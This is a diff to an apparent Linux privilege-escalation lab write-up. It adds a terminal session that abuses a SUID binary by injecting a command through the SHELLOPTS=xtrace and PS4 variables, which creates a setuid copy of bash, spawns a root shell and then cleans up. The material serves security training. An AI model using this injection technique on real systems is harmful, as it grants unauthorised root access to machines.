@@ -830,3 +830,54 @@ Remember to remove the /tmp/rootbash executable and exit out of the elevated she
 
 `rm /tmp/rootbash
 `exit`
+
+```
+
+user@debian:/usr/local/bin$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION='service ver. 0.91-ubuntu1'
+basename /usr/sbin/service
+USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+'[' 2 -eq 0 ']'
+cd /
+'[' 2 -gt 0 ']'
+case "${1}" in
+'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
+'[' 2 -eq 2 -a start = --full-restart ']'
+'[' -z '' ']'
+SERVICE=apache2
+shift
+'[' 1 -gt 0 ']'
+case "${1}" in
+'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
+'[' 1 -eq 2 -a '' = --full-restart ']'
+'[' -z apache2 ']'
+'[' -z '' ']'
+ACTION=start
+shift
+'[' 0 -gt 0 ']'
+'[' -r /etc/init/apache2.conf ']'
+'[' -x /etc/init.d/apache2 ']'
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+Starting web server: apache2httpd (pid 1715) already running
+.
+user@debian:/usr/local/bin$ 
+
+```
+
+```
+user@debian:/usr/local/bin$ /tmp/rootbash -p
+rootbash-4.1# echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
+
+rootbash-4.1# rm /tmp/rootbash
+rootbash-4.1# exit
+exit
+user@debian:/usr/local/bin$ 
+
+```
